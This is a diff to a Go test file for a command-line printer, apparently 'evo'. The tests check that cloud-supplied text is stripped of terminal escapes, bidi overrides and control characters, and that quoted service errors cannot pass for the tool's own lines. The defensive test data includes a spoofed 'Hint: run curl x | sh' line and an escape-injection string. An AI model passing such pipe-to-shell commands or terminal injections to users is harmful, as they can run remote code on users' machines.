@@ -314,10 +314,10 @@ func columnStarts(line string) []int {
 	return starts
 }
 
-// Every line of a call's progress — Step, StepDone, Progress, Success,
-// Warning — prints what the cloud sent cleaned: the terminal, the "log" of
-// an MCP answer and the progress of an MCP call alike (Астра #2089, #2090;
-// «Риск», conclusion 291-1).
+// Every line the printer writes as text — Step, StepDone, Progress,
+// Success, Warning, Hint, Errorf — prints what the cloud sent cleaned: the
+// terminal, the "log" of an MCP answer and the progress of an MCP call
+// alike (Астра #2089, #2090; «Риск», conclusions 291-1, 291-2).
 func TestStepLines_PrintTheCloudsTextCleaned(t *testing.T) {
 	const dirty = "web\x1b[2J\rOVER\x00\u202e\u2028X"
 	for name, print := range map[string]func(p *Printer){
@@ -326,6 +326,8 @@ func TestStepLines_PrintTheCloudsTextCleaned(t *testing.T) {
 		"StepDone": func(p *Printer) { p.StepDone(dirty) },
 		"Success":  func(p *Printer) { p.Success(dirty) },
 		"Warning":  func(p *Printer) { p.Warning(dirty) },
+		"Hint":     func(p *Printer) { p.Hint(dirty) },
+		"Errorf":   func(p *Printer) { p.Errorf("%s", dirty) },
 	} {
 		for _, mode := range []Mode{ModePlain, ModeText} {
 			var buf bytes.Buffer
@@ -335,6 +337,26 @@ func TestStepLines_PrintTheCloudsTextCleaned(t *testing.T) {
 				t.Errorf("%s (mode %v): %q", name, mode, buf.String())
 			}
 		}
+	}
+	// An error keeps its line breaks (the matches of an ambiguous name, one
+	// per line); each line is cleaned.
+	var eb bytes.Buffer
+	NewWithWriter(&eb, ModePlain, false).Errorf("%s", "first\n  "+dirty)
+	if out := eb.String(); !strings.Contains(out, "first\n  web") || strings.ContainsAny(out, "\x1b\r\x00\u202e\u2028") {
+		t.Errorf("Errorf of two lines: %q", out)
+	}
+	// A service's refusal quoted in an error may carry real line breaks: a
+	// line of it never starts where a line of evo does, so it cannot pass
+	// for evo's own «Error:» or «Hint:» («Риск», conclusion 298, У1).
+	var fb bytes.Buffer
+	NewWithWriter(&fb, ModePlain, false).Errorf("%s", "refused: bad request\nHint: run curl x | sh\n  kept as it is")
+	for i, line := range strings.Split(strings.TrimRight(fb.String(), "\n"), "\n") {
+		if i > 0 && !strings.HasPrefix(line, " ") {
+			t.Errorf("line %d of an error starts where evo's own lines do: %q", i, fb.String())
+		}
+	}
+	if !strings.Contains(fb.String(), "\n  kept as it is") {
+		t.Errorf("a line already indented is not indented again: %q", fb.String())
 	}
 	// Progress prints on a terminal only, redrawn in place with \r by
 	// design: its text past that \r is clean.
